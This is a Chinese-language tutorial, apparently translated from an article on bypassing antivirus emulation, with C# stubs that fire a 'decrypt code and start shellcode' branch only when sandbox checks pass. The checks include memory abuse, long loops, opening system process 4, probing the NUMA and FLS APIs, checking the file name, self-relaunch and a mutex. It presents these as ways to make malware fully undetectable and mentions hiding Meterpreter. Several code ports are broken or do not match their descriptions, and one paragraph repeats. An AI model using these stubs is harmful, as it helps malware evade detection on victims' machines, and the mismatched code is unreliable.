

### 前言：

```
“反病毒软件很容易绕过”， “反病毒软件是深度防御的必要条件”， “这个加密软件是FUD”
这是我在研究反病毒安全时听到的一些句子。我问自己，
嘿，绕过反病毒软件真的那么简单吗？经过一番研究，我（和其他人一样）得出了这样的结论
绕过防病毒软件有两个重要步骤：
隐藏可能被识别为恶意的代码。这通常是通过加密完成的。
对解密存根进行编码，使其不会被检测为病毒，也不会被绕过
模拟/沙盒。
在本文中，我将主要关注最后一个问题，即如何欺骗反病毒模拟/沙盒系统。
我给自己定了一个挑战，要找到六种方法来制作一个完全无法检测到的解密存根（在
事实上，我发现的方法远不止这些）。这里收集了一些方法。其中一些非常复杂（并且
大多数“FUD cryptor”卖家使用其中一种）。其他卖家太简单了，我不明白为什么我从来没有
之前见过这些。我非常确定地下和官方病毒编写者完全了解这些
所以我想与公众分享这些。
```





### 绕过反病毒理论

#### 静态签名分析



```
签名分析基于黑名单方法。当反病毒分析师检测到新的恶意软件时，
签名被发布。此签名可以基于特定的代码或数据（例如使用特定代码的互斥
签名通常基于恶意二进制文件最初执行的字节构建。反病毒软件
拥有包含数百万个签名的数据库，并将扫描的代码与此数据库进行比较。
第一个反病毒软件使用了这种方法；它仍然被使用，结合了启发式和动态分析。YARA
该工具可用于轻松创建规则，以分类和识别恶意软件。这些规则可以上传到反病毒软件
以及逆向工程工具。可以在 http://plusvic.github.io/yara/ 找到 YARA。
基于签名的分析的最大的问题是它不能用于检测新的恶意软件。因此，为了
基于旁路特征的分析，人们必须简单地构建一个新的代码，或者更确切地说，进行微小的精确
修改现有代码以擦除实际签名。多态病毒的优势在于
能够自动更改其代码（使用加密），这使得无法生成
单个二进制散列或和来识别特定的签名。仍然可以在单个比特串上构建签名。
在查看解密存根中的特定指令时，加密恶意代码。
```





#### 静态启发式分析

```
在这种情况下，反病毒软件将检查代码中是否存在已知的恶意软件模式。有许多可能的规则，具体取决于供应商。这些规则通常没有描述（我认为是为了避免它们被轻易绕过），所以并不总是容易理解为什么反病毒软件认为某个软件是恶意的。启发式分析的主要优点是它可以用来检测签名数据库中没有的新恶意软件。主要缺点是它会产生误报。一个例子：CallNextHookEx函数（参见MSDN，网址为http://msdn.microsoft.com/enus/library/windows/desktop/ms644974%28v=vs.85%29.aspx）通常由用户端的键盘记录器使用。如果检测到可执行文件的数据段中有该函数名，一些反病毒软件会检测到使用该函数是一种威胁，并会发出关于该软件的启发式警告。另一个例子是，打开“explorer.exe”进程并尝试写入其虚拟内存的代码被认为是恶意的。绕过启发式分析的最简单方法是确保所有恶意代码都是隐藏的。代码加密是最常用的方法。如果在解密之前二进制文件没有发出任何警报，并且解密存根没有执行任何常见的恶意操作，则不会检测到恶意软件。
我根据比尔·布伦登的 RootkitArsenel 书籍编写了此类代码的示例。此代码可在http://www.sevagas.com/?Code-segment-encryption 上找到，此处还有另一个链接，可以使 Meterpreter 可执行文件对 AV 不可见（在http://www.sevagas.com/?Hide-meterpreter-shellcode-in 上）。
```





#### 动态分析

```
如今，大多数反病毒软件将依赖于动态方法。当扫描可执行文件时，它在虚拟环境中启动并持续很短的时间。将其与特征验证和启发式分析相结合，即使依赖于加密，也可以检测到未知的恶意软件。事实上，代码在反病毒沙箱中是自我解密的；然后，“新代码”的分析可以触发一些可疑行为。如果有人使用加密/解密存根来隐藏恶意软件，大多数反病毒软件都可以检测到它，只要它们可以绕过解密阶段！

这意味着绕过动态分析意味着两件事：
-具有不可检测的自我解密机制（如启发式）
-阻止反病毒软件执行解密存根
我发现有很多简单的方法可以欺骗反病毒软件，使其不执行解密存根。
```



#### 防病毒限制

```

事实上，动态分析是复杂的东西，能够扫描数以百万计的文件，在
模拟环境，检查所有签名……它也有局限性。
动态分析模型有3个主要的局限性，可以利用：
-扫描必须非常快，因此每次扫描可以运行的操作数量有限
-模拟环境，因此不知道机器和恶意软件环境的特殊性
-模拟/沙盒环境具有一些可被恶意软件检测到的特殊性
```



### 试验条件

#### 本地环境

```
我已经构建了源代码，并在运行Windows Vista和7的虚拟机上测试了代码，并安装了本地（免费版）的AV。
```



### 一.你必须拒绝的提议

#### 1.内存滥用

```
在第一个示例中，我们仅分配并填充 100 MB 内存。 这足以阻止任何模拟 AV。注意：在下面的代码中，大多数 AV 将在 malloc 期间停止，甚至不需要对分配的指针进行条件验证。
看看减少 AV 检测是多么容易？ 此外，此方法依赖于经典且非常常见的 malloc 函数，并且不需要任何可用于构建签名的字符串。 唯一的缺点是 100M 字节内存突发，可以通过精细的系统监控检测到
```

![image-20231116172852515](fanyisharuan.assets/image-20231116172852515.png)

c#版本

```


class Program
{	
	const int TOO_MUCH_MEM = 100000000;
    static void Main()
    {
        char[] memdmp = null;
        memdmp = new char[TOO_MUCH_MEM];
        if (memdmp != null)
        {
            for (int i = 0; i < TOO_MUCH_MEM; i++)
            {
                memdmp[i] = '\0';
            }
        }
        memdmp = null;
        run()
    }

    static void decryptCodeSection()
    {
        // Add your code for decrypting the code section here
    }

    static void startShellCode()
    {
        // Add your code for starting the shell code here
    }
}
```



#### 2.无限循环



一种更简单的方法，不会留下任何系统痕迹，包括执行基本操作足够的时间。 在本例中，我们使用 for 循环将计数器递增一亿次。 这足以绕过 AV，但对于现代 CPU 来说根本不算什么。 在使用或不使用此存根启动代码时，人类不会检测到任何差异

for循环1亿次。。。

![image-20231116173151552](fanyisharuan.assets/image-20231116173151552.png)

c#版本

```
using System;

class Program
{
    const int MAX_OP = 100000000;

    static void Main()
    {
        int cpt = 0;
        int i = 0;

        for (i = 0; i < MAX_OP; i++)
        {
            cpt++;
        }

        if (cpt == MAX_OP)
        {
            Run();
        }

        return;
    }

    static void Run()
    {
        // Your code to run goes here
        Console.WriteLine("Running...");
    }
}
```



这里的概念是，由于上下文是在模拟系统中启动的，因此可能会出现错误，并且代码可能无法在其正常权限下运行。 通常，代码将以系统上几乎所有权限运行。 这可以用来猜测正在分析的代码。



### 二.我不应该能做到这个！



这里的概念是，由于上下文是在模拟系统中启动的，因此可能会出现错误，并且代码可能无法在其正常权限下运行。 通常，代码将以系统上几乎所有权限运行。 这可以用来猜测正在分析的代码。

#### 尝试打开系统进程

该代码只是尝试打开进程号 4，该进程通常是一个系统进程，具有所有权限。 如果代码未使用系统 MIC 和会话 0 运行，则此操作应该会失败（OpenProcess 返回 00）。 在 VirusTotal 分数上，您可以看到这不是 FUD 方法，而是绕过了一些容易受到此特定问题影响的 AV

![image-20231116173718623](fanyisharuan.assets/image-20231116173718623.png)



```

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const int ERROR_SUCCESS = 0;
    const int INVALID_HANDLE_VALUE = -1;

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    static void Main()
    {
        IntPtr proc = OpenProcess(PROCESS_ALL_ACCESS, false, 4);

        if (proc == IntPtr.Zero || proc.ToInt32() == INVALID_HANDLE_VALUE)
        {
            DecryptCodeSection();
            StartShellCode();
        }

        CloseHandle(proc);

        return;
    }

    static void DecryptCodeSection()
    {
        // Your code to decrypt the code section goes here
        Console.WriteLine("Decrypting code section...");
    }

    static void StartShellCode()
    {
        // Your code to start the shell code goes here
        Console.WriteLine("Starting shell code...");
    }
}
```



然而，与§4.3 中的 AV 不同，事实上只有几个检测到 meterpreter 部分。 所有其他都会触发 OpenProcess 代码作为恶意后门（静态启发式分析）。 这里的重点是显示模拟环境的行为与正常情况不同（恶意代码在 AV 中以高权限进行模拟）。
这可以在不触发启发式检测的情况下进行调整，例如，如果恶意代码应该在没有管理员权限的情况下启动。



#### 尝试打开不存在的 URL

```
一种经常用于让代码自我感知进入沙箱的方法是在互联网上下载特定文件，并将其哈希值与代码知道的哈希值进行比较。 为什么它有效？ 因为 sandboxes 环境不会让潜在的恶意代码对互联网进行任何访问。 当沙箱代码打开互联网页面时，沙箱只会发送自己生成的文件。 因此，代码可以将此文件与它期望的文件进行比较。
此方法有一些问题，首先，如果您没有 Internet 访问权限，它将永远无法工作。 其次，如果下载的文件发生更改或被删除，代码也将无法工作。另一种不存在这些问题的方法是执行相反的操作！ 尝试访问不存在的 Web 域。 在现实世界中，它会失败。 在 AV 中，它会起作用，因为 AV 将使用自己的模拟页面。
```

![image-20231116174133361](fanyisharuan.assets/image-20231116174133361.png)



这里有一些有趣的事情。 在这两个结果中，我有一个 AV 认为我的存根可能是一个滴管（愚蠢的启发式误报......）。 第二个确实发现了Meterpreter后门。 这真的很奇怪。 这意味着这些人要么拥有真正智能的系统，要么在他们使用的沙箱中允许 AV 连接。
我记得读到过有人在上传到 VirusTotal 时实际上获得了远程 Meterpreter 连接。 也许是同一个扫描仪





### 三.“了解你的敌人”的方法

如果知道目标机器上的一些信息，绕过任何反病毒软件就变得非常容易。 只需将代码解密机制链接到您在目标 PC（或一组 PC）上知道的一些信息即可。
#### 用户？信息判断

：取决于本地用户名的操作如果系统上某人的用户名已知，则可以根据该用户名请求操作。 例如，我们可以尝试在用户帐户文件中写入和读取。 在下面的代码中，我们在用户桌面上创建一个文件，在其中写入一些字符，然后只有我们可以打开该文件并读取字符，我们开始解密方案。

![image-20231116174506071](fanyisharuan.assets/image-20231116174506071.png)

```
using System;
using System.IO;

class Program
{
    static void Main()
    {
        string filePath = "test.txt";

        if (File.Exists(filePath))
        {
            Run();
        }
        else
        {
            Console.WriteLine("File 'test.txt' does not exist. Exiting...");
        }
    }

    static void Run()
    {
        // Your code to run goes here
        Console.WriteLine("Running...");
    }
}
```



不用说，这是 FUD。 事实上，AV 扫描程序通常无法创建和写入未预见路径中的文件。 一开始我很惊讶，因为我期望 AV 能够自我适应主机 PC，但事实并非如此（我已经在同一台 PC 上使用多个 AV 进行了测试，而不仅仅是使用 VirusTotal）



### 四.“那是什么？” 方法



Windows系统API非常庞大，AV仿真系统并不能涵盖所有内容。 在本节中，我只举了两个示例，但 Windows 系统 API 中还存在许多其他示例。

#### windows api判断

NUMA 到底是什么？
NUMA 代表非统一内存访问。 它是一种在多处理系统中配置内存管理的方法。 它链接到 Kernel32.dl 中声明的一整套函数

http://msdn.microsoft.com/en-us/library/windows/desktop/aa363804%28v=vs.85%29.aspx

下一个代码将在普通 PC 上运行，但在 AV 模拟器中将失败。

![image-20231116174830067](fanyisharuan.assets/image-20231116174830067.png)



```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class Program
{
    const int MEM_RESERVE = 0x00002000;
    const int MEM_COMMIT = 0x00001000;
    const int PAGE_EXECUTE_READWRITE = 0x40;
    const int ERROR_SUCCESS = 0;

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    static void Main()
    {
        IntPtr mem = VirtualAllocEx(GetCurrentProcess(), IntPtr.Zero, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);

        if (mem != IntPtr.Zero)
        {
            DecryptCodeSection();
            StartShellCode();
        }

        return;
    }

    static void DecryptCodeSection()
    {
        // Your code to decrypt the code section goes here
        Console.WriteLine("Decrypting code section...");
    }

    static void StartShellCode()
    {
        // Your code to start the shell code goes here
        Console.WriteLine("Starting shell code...");
    }
}
```





#### FLS是什么鬼？

FLS是光纤本地存储，用于操作与光纤相关的数据。 纤程本身是在线程内运行的执行单元。 请参阅http://msdn.microsoft.com/en gb/library/windows/desktop/ms682661%28v=vs.85%29.aspx 中的更多信息

这里有趣的是，一些 AV 模拟器将始终为 FlsAlloc 函数返回 FLS_OUT_OF_INDEXES。



![image-20231116175059686](fanyisharuan.assets/image-20231116175059686.png)

```
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr FlsAlloc(IntPtr lpCallback);

    [DllImport("kernel32.dll")]
    public static extern bool FlsFree(IntPtr dwFlsIndex);

    static void Main()
    {
        IntPtr result = FlsAlloc(IntPtr.Zero);
        if (result != IntPtr.Zero)
        {
            DecryptCodeSection();
            StartShellCode();
            FlsFree(result);
        }
    }

    static void DecryptCodeSection()
    {
        // 实现解密代码段的逻辑
        Console.WriteLine("Decrypting code section...");
    }

    static void StartShellCode()
    {
        // 实现启动Shell Code的逻辑
        Console.WriteLine("Starting shell code...");
    }
}
```







### 五.“检查环境”方法



这里的原理又很简单。 如果反病毒依赖于沙盒/模拟环境，某些环境检查必然与真实感染情况不同。
有很多方法可以进行此类检查。 本节描述了其中两个：
#### 检查进程内存
使用 sysinternal 工具，我意识到当 AV 扫描进程时，它会影响其内存。 反病毒软件将为此分配内存，模拟的代码处理 API 也将返回与预期不同的值。 在本例中，我对当前进程使用 GetProcessMemoryInfo。 如果当前工作集大于 3500000 字节，我认为代码正在 AV 环境中运行，如果不是这种情况，代码将被解密并启动。

![image-20231116175246923](fanyisharuan.assets/image-20231116175246923.png)

几乎FUD。 此外，AV 似乎没有检测到 Meterpreter，而是在主函数上触发了一些启发式方法。 检测事件似乎与被恶意软件修补的 Windows 系统可执行文件相关联（不要问我为什么在这种情况下此代码被认为是修补的 Windows 二进制文件......）





#### 时间扭曲

我们知道Sleep功能是AV模拟的。 这样做是为了防止通过简单调用 Sleep 来绕过扫描时间限制。 问题是，Sleep 的模拟方式是否存在缺陷？

![image-20231116175428067](fanyisharuan.assets/image-20231116175428067.png)

显然有些 AV 上当了。



#### 我的名字是什么？

由于代码是模拟的，因此它不会在具有二进制文件名称的进程中启动。 Attila Marosi 在 DeepSec 中描述了此方法 http://blog.deepsec.net/?p=1613
测试的二进制文件是“test.exe”。 在扩展代码中，我们检查第一个参数是否包含文件名

![image-20231116175540097](fanyisharuan.assets/image-20231116175540097.png)

```
using System;

class Program
{
    static void Main(string[] args)
    {
        string executableName = "test.exe";

        if (Array.Exists(args, arg => arg.Contains(executableName)))
        {
            Run();
        }
    }

    static void Run()
    {
        // 执行需要运行的逻辑
        Console.WriteLine("Running...");
    }
}
```



DeepSec 文章写于 2013 年，方法仍然 FUD



### 六.“我call自己”方法



这是环境检查方法的一种变体。 仅当以某种方式调用该代码时，AV 才会触发该代码。
#### 我是我自己的父亲
在此示例中，可执行文件 (test.exe) 仅当其父进程也是 test.exe 时才会进入解密分支。 当代码启动时，它将获取其父进程ID，如果该父进程不是test.exe，它将调用test.exe，然后停止。 然后，被调用的进程将有一个名为 test.exe 的父进程，并将进入解密部分。

![image-20231116175758903](fanyisharuan.assets/image-20231116175758903.png)



![image-20231116175809747](fanyisharuan.assets/image-20231116175809747.png)



```
using System;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        if (!IsParentProcessTestExe())
        {
            LaunchParentProcess();
            return;
        }

        Run();
    }

    static bool IsParentProcessTestExe()
    {
        using (Process currentProcess = Process.GetCurrentProcess())
        {
            using (Process parentProcess = GetParentProcess(currentProcess))
            {
                return parentProcess != null && parentProcess.ProcessName.Equals("test", StringComparison.OrdinalIgnoreCase);
            }
        }
    }

    static Process GetParentProcess(Process process)
    {
        int parentProcessId = 0;
        IntPtr hSnapshot = IntPtr.Zero;

        try
        {
            hSnapshot = NativeMethods.CreateToolhelp32Snapshot(NativeMethods.SnapshotFlags.Process, 0);

            if (hSnapshot != IntPtr.Zero && hSnapshot != NativeMethods.INVALID_HANDLE_VALUE)
            {
                NativeMethods.PROCESSENTRY32 pe32 = new NativeMethods.PROCESSENTRY32();
                pe32.dwSize = (uint)System.Runtime.InteropServices.Marshal.SizeOf(typeof(NativeMethods.PROCESSENTRY32));

                if (NativeMethods.Process32First(hSnapshot, ref pe32))
                {
                    do
                    {
                        if (pe32.th32ProcessID == process.Id)
                        {
                            parentProcessId = (int)pe32.th32ParentProcessID;
                            break;
                        }
                    }
                    while (NativeMethods.Process32Next(hSnapshot, ref pe32));
                }
            }
        }
        finally
        {
            if (hSnapshot != IntPtr.Zero && hSnapshot != NativeMethods.INVALID_HANDLE_VALUE)
            {
                NativeMethods.CloseHandle(hSnapshot);
            }
        }

        if (parentProcessId > 0)
        {
            try
            {
                return Process.GetProcessById(parentProcessId);
            }
            catch (ArgumentException) { }
            catch (InvalidOperationException) { }
        }

        return null;
    }

    static void LaunchParentProcess()
    {
        Process.Start("test.exe");
    }

    static void Run()
    {
        // 执行解密分支的逻辑
        Console.WriteLine("Running decryption branch...");
    }
}

internal static class NativeMethods
{
    public const int MAX_PATH = 260;
    public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

    public enum SnapshotFlags : uint
    {
        Process = 0x00000002
    }

    [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
        public string szExeFile;
    }

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateToolhelp32Snapshot(SnapshotFlags dwFlags, uint th32ProcessID);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
```



AV 通常无法跟踪此类进程，因为它们将扫描父进程而不是子进程（即使实际上是相同的代码）。



#### 首先打开一个互斥锁

在此示例中，如果系统上已存在某个互斥对象，代码 (test.exe) 将仅启动解密代码。 诀窍是，如果该对象不存在，此代码将创建并调用其自身的新实例。 子进程将尝试在父进程终止之前创建互斥体，并陷入 ERROR_ALREADY_EXIST 代码范围。

![image-20231116175956792](fanyisharuan.assets/image-20231116175956792.png)

```
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    static void Main()
    {
        Mutex mutex = new Mutex(true, "muuuu");
        
        if (Marshal.GetLastWin32Error() == 183 /*ERROR_ALREADY_EXISTS*/)
        {
            DecryptCodeSection();
            StartShellCode();
        }
        else
        {
            Process.Start("test.exe");
            Thread.Sleep(168000);
        }
    }

    static void DecryptCodeSection()
    {
        // 执行解密代码段的逻辑
    }

    static void StartShellCode()
    {
        // 执行启动Shell代码的逻辑
    }
}
```





### 结论

```
总而言之，这些示例表明，当您利用 AV 的弱点时，绕过 AV 是非常简单的。 它只需要一些关于 Windows 系统和 AV 工作原理的知识。 不过，我并不是说有了AV就没有用了。 AV 对于检测其数据库中已有的数百万个野生机器人非常有用。 AV 对于系统恢复也很有用。 我的意思是，AV 很容易被新病毒愚弄，特别是在有针对性的攻击的情况下。
定制的恶意软件通常用作 APT 的一部分，而 AV 可能对它们毫无用处。 这并不意味着一切都会丢失！ 除了 AV、系统强化、应用程序白名单、主机入侵防御系统之外，还有其他解决方案。 这些解决方案都有自己的优点和缺点。
如果我可以针对恶意软件提出一些谦虚的建议，我会说：
如果没有必要，切勿以管理员身份运行。 这是一条黄金法则，无需 AV 即可避免 99% 的恶意软件。 多年来，这一直是 Linux 用户的正常做事方式。 我认为这是最重要的安全措施。
 强化系统，最新版本的 Windows 具有非常强大的安全功能，请使用它们。  投资网络入侵检测系统并监控您的网络。 通常，由于奇怪的 NIDS 或防火墙日志，受害者 PC 上不会检测到恶意软件感染。
 如果您负担得起，请使用不同供应商的多种 AV 产品。 一种产品可以掩盖另一种产品的弱点，而且来自一个国家的产品也有可能对该国政府的恶意软件友好。
 如果您负担得起，请使用不同供应商的其他类型的安全产品。  最后但并非最不重要的一点是人员培训。 当人类可以被剥削时，工具就毫无意义
```





